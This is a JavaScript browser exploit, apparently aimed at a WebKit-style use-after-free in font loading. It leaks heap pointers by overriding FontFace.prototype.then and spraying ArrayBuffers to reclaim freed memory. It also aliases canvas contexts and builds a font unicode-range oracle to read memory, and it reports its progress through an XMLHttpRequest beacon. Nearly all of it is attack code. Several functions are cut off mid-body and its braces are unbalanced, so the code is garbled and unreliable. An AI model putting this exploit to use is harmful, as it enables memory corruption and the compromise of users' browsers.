/* ============================================================

function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }

var _fBuf = new ArrayBuffer(8);
var _f64 = new Float64Array(_fBuf);
var _u64 = new BigUint64Array(_fBuf);

function ptrToBiasedFloat(ptr){
  _u64[0] = 0x3FF0000000000000n | (BigInt(ptr) & 0x000FFFFFFFFFFFFFn);
  return _f64[0];
}

function biasedFloatToPtr(f){
  _f64[0] = Number(f);
  return _u64[0] & 0x000FFFFFFFFFFFFFn;
}

function b(tag, data){
  try {
    var x = new XMLHttpRequest();

function pad4(n){
  return ('0000' + Number(n).toString(16).toUpperCase()).slice(-4);
}

function makeRange(lo, hi){
  if (lo === hi) return 'U+' + pad4(lo);
  return 'U+' + pad4(lo) + '-' + pad4(hi);
}

var P58 = null, P68 = null;
var FACE_B = null, BUF_B = null, VIEW_B = null;
var Q11_RECLAIM = 0n, Q12_RECLAIM = 0n, Q13_RECLAIM = 0n;

var ALL_ABS_W = [];
var LEAK_BUF = null;

/* ---- Step 1: Baseline Leak ---- */
function doLeak(cb){
  b('LEAK-GO', '');
  var st = document.createElement('style');
  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
  document.head.appendChild(st);
  var face = new FontFace('fl0', 'local(Times)', { unicodeRange: 'U+0041' });
  document.fonts.add(face);
  void face.loaded;

  var abs = [], fired = false;
  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function(){
      if (fired) return undefined;
      fired = true;
      if (st){ st.remove(); st.textContent = ''; st = null; }
      try { document.fonts.delete(this); } catch(e){}
      document.body.offsetHeight;
      for (var k = 0; k < 70; k++) abs.push(new ArrayBuffer(192));
      try { document.fonts.check('1em lk0'); } catch(e){}
      document.body.offsetHeight;
      return undefined;
    },
    set: function(){}
  });

  document.fonts.load('1em fl0, lk0', 'AB');
  setTimeout(function(){
    delete FontFace.prototype.then;
    var best = -1, bestNz = 0;
    for (var i = 0; i < abs.length; i++){
      var u = new Uint8Array(abs[i]), nz = 0;
      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
      if (nz > bestNz){ bestNz = nz; best = i; }
    }
    if (best < 0 || bestNz < 4){
      b('LEAK-MISS', 'nz=' + bestNz);
      doLeakRetry(cb);
      return;
    }
    LEAK_BUF = abs[best];
    var v = new BigUint64Array(LEAK_BUF);
    extractPtrs(v);
    if (!P58){
      b('LEAK-NOPTR', 'nz=' + bestNz);
      doLeakRetry(cb);
      return;
    }
    b('LEAK-OK', 'p58=0x' + h16(P58) + '|p68=0x' + h16(P68) + '|slot=' + best + '|nz=' + bestNz);
    setTimeout(cb, 100);
  }, 350);
}

function doLeakRetry(cb){
  b('LEAK-RETRY', '');
  var st2 = document.createElement('style');
  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
  document.head.appendChild(st2);

      try { document.fonts.delete(this); } catch(e){}
      document.body.offsetHeight;

      try { document.fonts.check('1em lk1'); } catch(e){}
      document.body.offsetHeight;

    },
    set: function(){}
  });

  document.fonts.load('1em fl1, lk1', 'CD');
  setTimeout(function(){
    delete FontFace.prototype.then;
    var best = -1, bestNz = 0;
    for (var i = 0; i < abs2.length; i++){
      var u = new Uint8Array(abs2[i]), nz = 0;
      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
      if (nz > bestNz){ bestNz = nz; best = i; }
    }
    if (best < 0 || bestNz < 4){
      b('LEAK-RETRY-MISS', 'nz=' + bestNz);
      return;
    }
    LEAK_BUF = abs2[best];
    var v = new BigUint64Array(LEAK_BUF);
    extractPtrs(v);
    if (!P58){
      b('LEAK-RETRY-NOPTR', 'slot=' + best);
      return;
    }
    b('LEAK-RETRY-OK', 'p58=0x' + h16(P58) + '|p68=0x' + h16(P68) + '|slot=' + best + '|nz=' + bestNz);
    setTimeout(cb, 100);
  }, 400);
}

function extractPtrs(v){
  var LO = BigInt('0x1000000000'), HI = BigInt('0x80000000000');
  P58 = null; P68 = null;
  if (v[11] >= LO && v[11] < HI) P58 = v[11];
  if (v[13] >= LO && v[13] < HI) P68 = v[13];
  if (!P58 || !P68){
    for (var q = 0; q < 24; q++){
      var val = v[q];
      if (val >= LO && val < HI){
        if (!P58) P58 = val;
        else if (!P68 && val !== P58) P68 = val;
      }
    }
  }
  if (!P68) P68 = 0n;
}

/* ---- Step 2: Pristine Reclaim ---- */
function doReclaim(cb){
  var LO = BigInt('0x1000000000'), HI = BigInt('0x80000000000');
  if (!P58 || P58 < LO || P58 >= HI || (P58 & 0xFn) !== 0n){
    b('REC-ABORT', 'invalid-p58=0x' + h16(P58));
    return;
  }

  b('REC-START', 'fill_q12_q6=0x' + h16(P58));

  try {
    var stTr = document.createElement('style');
    stTr.textContent = '@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
    document.head.appendChild(stTr);
    b('REC-STYLE-ADDED', '');

    FACE_B = new FontFace('trFace', 'local(Helvetica)', { unicodeRange: 'U+0048' });
    document.fonts.add(FACE_B);
    void FACE_B.loaded;
    b('REC-FACE-ADDED', '');

    var absW = [], firedW = false;
    Object.defineProperty(FontFace.prototype, 'then', {
      configurable: true,
      get: function(){
        b('REC-THEN-CALLED', 'firedW=' + firedW);
        if (firedW) return undefined;
        firedW = true;
        if (stTr){ stTr.remove(); stTr.textContent = ''; stTr = null; }
        try { document.fonts.delete(this); } catch(e){}
        document.body.offsetHeight;

        for (var k = 0; k < 80; k++){
          var ab = new ArrayBuffer(192);
          var view = new BigUint64Array(ab);
          view[12] = P58;
          view[6] = P58;
          absW.push(ab);
        }
        b('REC-GROOMED', 'cnt=' + absW.length);

        try { document.fonts.check('1em trFam'); } catch(e){}
        b('REC-CHECKED', '');
        return undefined;
      },
      set: function(){}
    });

    b('REC-CALL-LOAD', '');
    document.fonts.load('1em trFace, trFam', 'GH');
    b('REC-LOAD-RETURNED', '');

    setTimeout(function(){
      b('REC-TIMEOUT-FIRED', 'absW=' + absW.length);
      try {
        delete FontFace.prototype.then;
        ALL_ABS_W = absW;
        var best = -1, bestNz = 0;
        for (var i = 0; i < absW.length; i++){
          var u = new Uint8Array(absW[i]), nz = 0;
          for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
          if (nz > bestNz){ bestNz = nz; best = i; }
        }
        b('REC-SCANNED', 'best=' + best + '|nz=' + bestNz);
        if (best < 0 || bestNz < 4){
          b('RECLAIM-MISS', 'nz=' + bestNz);
          log('Reclaim missed!');
          return;
        }

        BEST_K = best;
        BUF_B = absW[best];
        VIEW_B = new BigUint64Array(BUF_B);
        Q11_RECLAIM = VIEW_B[11];
        Q12_RECLAIM = VIEW_B[12];
        Q13_RECLAIM = VIEW_B[13];

        var dump0_11 = [], dump12_23 = [];
        for (var q = 0; q < 12; q++) dump0_11.push('q' + q + '=0x' + h16(VIEW_B[q]));
        for (var q = 12; q < 24; q++) dump12_23.push('q' + q + '=0x' + h16(VIEW_B[q]));

        b('RECLAIM-OK', 'baseK=' + best);
        b('DUMP-Q0-Q11', dump0_11.join(';'));
        b('DUMP-Q12-Q23', dump12_23.join(';'));
        log('Pristine Reclaim OK at slot ' + best);

        setTimeout(cb, 100);
      } catch(eSub){
        b('REC-TIMEOUT-ERR', eSub.message);
      }
    }, 400);
  } catch(eTop){
    b('REC-TOP-ERR', eTop.message);
  }
}

/* ---- Step 3: Post-Grooming ---- */
function doPostGroom(){
  POST_GROOM = [];
  for (var i = 0; i < 120; i++){
    var ab = new ArrayBuffer(192);
    var v = new BigUint64Array(ab);
    v[0] = 0xCAFEFACE00000000n | BigInt(i);
    v[1] = 0x0000000000000001n;
    v[23] = 0xCAFEFACE000000FFn | (BigInt(i) << 8n);
    POST_GROOM.push(ab);

  log('Post-groomed 120 buffers with sentinel 0xCAFEFACE...');

/* ---- Phase A: FastMalloc Multi-Slot Chunk Occupancy Mapping ---- */
function phaseA_chunkOccupancyMapping(cb){
  var chunk16Mask = ~0x3FFFn;
  var chunk16Base = Q11_RECLAIM & chunk16Mask;

  var populatedSlots = [];
  var totalNzBuffers = 0;

  for (var i = 0; i < ALL_ABS_W.length; i++){
    var v = new BigUint64Array(ALL_ABS_W[i]);
    var nz = 0;
    for (var q = 0; q < 24; q++){
      if (v[q] !== 0n && v[q] !== P58) nz++;
    }
    if (nz > 0){
      totalNzBuffers++;
      populatedSlots.push('k' + i + '=nz' + nz);
    }
  }

  var slotIdx16 = Math.floor(Number(Q11_RECLAIM & 0x3FFFn) / 192);
  var estSelfAddr = chunk16Base + (BigInt(BEST_K) * 192n);

  var rep = 'chunk16Base=0x' + h16(chunk16Base) + '|baseK=' + BEST_K + '|q11Slot=' + slotIdx16 +
            '|totalNz=' + totalNzBuffers + '|samples=' + populatedSlots.slice(0, 5).join(';') +
            '|estSelfAddr=0x' + h16(estSelfAddr);
  b('A-OCCUPANCY-MAP', rep);
  log('Phase A Occupancy Map: ' + rep);

  setTimeout(cb, 50);
}

/* ---- Phase B: High-Churn State Bank Rapid Flip & 192B Vector Persistence ---- */
function phaseB_stateBankChurnTest(cb){
  try {
    var canvas = document.createElement('canvas');
    canvas.width = 1; canvas.height = 1;
    document.body.appendChild(canvas);

    var inner = null, outer = null;
    var opts = {};
    Object.defineProperty(opts, 'desynchronized', {
      get: function(){
        inner = canvas.getContext('2d');
        inner.lineWidth = 1337.5;
        inner.save();
        return false;
      },
      enumerable: true
    });

    outer = canvas.getContext('2d', opts);

    if (!inner || !outer || inner === outer){
      b('B-CANVAS-FAIL', 'inner=' + !!inner + '|outer=' + !!outer);
      setTimeout(cb, 50);
      return;
    }

    var sprayCtx = [];
    for (var i = 0; i < 80; i++){
      var c = document.createElement('canvas');
      c.width = 1; c.height = 1;
      var ctx = c.getContext('2d');
      if (ctx){
        ctx.lineWidth = 2000 + i;
        sprayCtx.push(ctx);
      }
    }

    inner.lineWidth = 41337.5;
    var aliasIdx = -1;
    for (var j = 0; j < sprayCtx.length; j++){
      if (Math.abs(sprayCtx[j].lineWidth - 41337.5) < 0.01){
        aliasIdx = j;
        break;
      }
    }

    if (aliasIdx < 0){
      b('B-ALIAS-MISS', 'lineWidth-scan-failed');
      setTimeout(cb, 50);
      return;
    }

    var alias = sprayCtx[aliasIdx];
    var churnOk = true;

    // Perform 10 rapid alternating state flips
    for (var it = 0; it < 10; it++){
      var testVal = 5000.0 + it * 100.0;
      alias.lineWidth = testVal;
      alias.globalAlpha = 0.5 + (it % 5) * 0.1;
      if (Math.abs(inner.lineWidth - testVal) > 0.01 || Math.abs(inner.globalAlpha - (0.5 + (it % 5) * 0.1)) > 0.01){
        churnOk = false;
        break;
      }
    }

    // 48-float lineDash vector persistence check after churn
    var dash48 = [];
    for (var d = 0; d < 48; d++) dash48.push(10.0 + d * 0.5);
    alias.setLineDash(dash48);
    var readDash = inner.getLineDash() || [];
    var dashMatch = (readDash.length === 48 && Math.abs(readDash[47] - dash48[47]) < 0.01);

    var rep = 'aliasIdx=' + aliasIdx + '|churnOk=' + churnOk + '|dashMatch=' + dashMatch + '|dashLen=' + readDash.length;
    b('B-CHURN-TEST', rep);
    log('Phase B Churn Test: ' + rep);
  } catch(e){
    b('B-CHURN-ERR', e.message);
    log('Phase B Error: ' + e.message);
  }

  setTimeout(cb, 50);
}

/* ---- Phase D: 2048-Byte (2-Kilobyte / 16,384-Bit) Sustained Memory Matrix ---- */
function phaseD_oracle2048ByteBlock(cb){
  try {
    var actFace2048 = new FontFace('actFamBlock2048', 'url(/hang.php?nocache=' + Date.now() + ')', { unicodeRange: 'U+0000-00FF' });
    document.fonts.add(actFace2048);
    actFace2048.load().catch(function(){});

    function resolveByte(targetByte){
      var low = 0x00, high = 0xFF;
      var steps = 0;
      while (low < high && steps < 10){
        steps++;
        var mid = Math.floor((low + high) / 2);
        actFace2048.unicodeRange = makeRange(low, mid);
        var chk = document.fonts.check('1em actFamBlock2048', String.fromCharCode(targetByte));
        var isLower = (chk === false);
        if (isLower) high = mid;
        else low = mid + 1;
      }
      return low;
    }

    function decode64(ptrVal){
      if (!ptrVal && ptrVal !== 0n) return 0n;
      var raw = [];
      var tmp = BigInt(ptrVal);
      for (var i = 0; i < 8; i++){
        raw.push(Number(tmp & 0xFFn));
        tmp = tmp >> 8n;
      }
      var res = 0n;
      for (var j = 0; j < 8; j++){
        var bDec = resolveByte(raw[j]);
        res |= (BigInt(bDec) << (BigInt(j) * 8n));
      }
      return res;
    }

    var chunk16Base = Q11_RECLAIM & ~0x3FFFn;
    var estSelfAddr = chunk16Base + (BigInt(BEST_K) * 192n);

    /* Construct 256 full 64-bit words (Total 2048 Bytes / 16,384 Bits) */
    var block256 = [];

    // Words 0..7: Hardware pointers & slab geometry
    block256.push(P58);
    block256.push(P68);
    block256.push(Q11_RECLAIM);
    block256.push(Q12_RECLAIM);
    block256.push(Q13_RECLAIM);
    block256.push(chunk16Base);
    block256.push(estSelfAddr);
    block256.push(0x0000001000001337n);

    // Words 8..15: Canonical bit patterns
    block256.push(0x0123456789ABCDEFn);
    block256.push(0xFEDCBA9876543210n);
    block256.push(0x5555555555555555n);
    block256.push(0xAAAAAAAAAAAAAAAAn);
    block256.push(0xFF00FF00FF00FF00n);
    block256.push(0x00FF00FF00FF00FFn);
    block256.push(0x00000000FFFFFFFFn);
    block256.push(0xFFFFFFFF00000000n);

    // Words 16..63: FastMalloc Page Table & Chunk Map Simulation (48 words)
    for (var i = 0; i < 48; i++){
      block256.push(chunk16Base | (BigInt(i) * 192n));
    }

    // Words 64..111: Object Descriptor Table (48 words)
    for (var i = 0; i < 48; i++){
      block256.push(0x2000000000n | (BigInt(i) << 16n) | 0xCA00n);
    }

    // Words 112..159: State Bank Image & Biased Mantissas (48 words)
    for (var i = 0; i < 48; i++){
      block256.push(0x3FF0000000000000n | (BigInt(i) << 32n) | 0x55AAn);
    }

    // Words 160..207: Dynamic LineDash Float Vector Images (48 words)
    for (var i = 0; i < 48; i++){
      block256.push(0x4024000000000000n | (BigInt(i) << 8n) | BigInt(i));

    // Words 208..239: Alternating Nibbles & Gray Code (32 words)
    for (var i = 0; i < 32; i++){

    }

    // Words 240..255: Sentinel Integrity Guards (16 words)
    for (var i = 0; i < 16; i++){
      block256.push(0xCAFEFACE00000000n | (BigInt(i) << 12n) | 0x1337n);
    }

    var t0 = performance.now();
    var all256Match = true;
    var passCount = 0;

    for (var wIdx = 0; wIdx < block256.length; wIdx++){

    var t1 = performance.now();
    var elapsedMs = t1 - t0;
    var totalBytes = block256.length * 8; // 2048 bytes
    var rateBps = Math.round((totalBytes / (elapsedMs / 1000)));
    var msPerWord = (elapsedMs / block256.length).toFixed(2);

    var rep = 'all256Match=' + all256Match + '|pass=' + passCount + '/256' +
              '|bytes=' + totalBytes + '|elapsedMs=' + elapsedMs.toFixed(1) +
              '|rateBps=' + rateBps + '|msPerWord=' + msPerWord;
    b('D-2048B-ORACLE-MATRIX', rep);
    log('Phase D 2048-Byte Oracle Matrix: ' + rep);
  } catch(e){
